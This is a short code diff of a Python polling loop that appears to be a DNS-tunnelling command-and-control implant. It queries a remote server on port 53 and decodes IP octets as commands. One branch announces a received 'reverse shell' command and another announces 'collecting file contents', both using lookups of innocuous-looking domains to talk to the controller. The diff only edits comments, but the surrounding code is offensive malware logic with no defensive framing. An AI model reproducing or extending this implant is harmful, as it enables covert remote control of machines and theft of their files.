@@ -73,7 +73,7 @@ while True:
     
     if(len(ips) == 1):
         ipSplit = ips[0].split('.')
-        if(ipSplit[3] == "232"):
+        if(ipSplit[3] == "232"): #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
             print("Reverse Shell command recieved")
             sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
             resp, _ = sock.recvfrom(512)
@@ -82,10 +82,10 @@ while True:
             print("Resolved IPs:", ips)
             
             time.sleep(10)
-        elif(ipSplit[3] == "85"):
+        elif(ipSplit[3] == "85"): 
             print("Collecting file contents")
             
-            sock.sendto(makeQuery("fileshare.org"), (SERVER, 53))
+            sock.sendto(makeQuery("fileshare.org"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
             resp, _ = sock.recvfrom(512)
 
             ips = getResponse(resp)
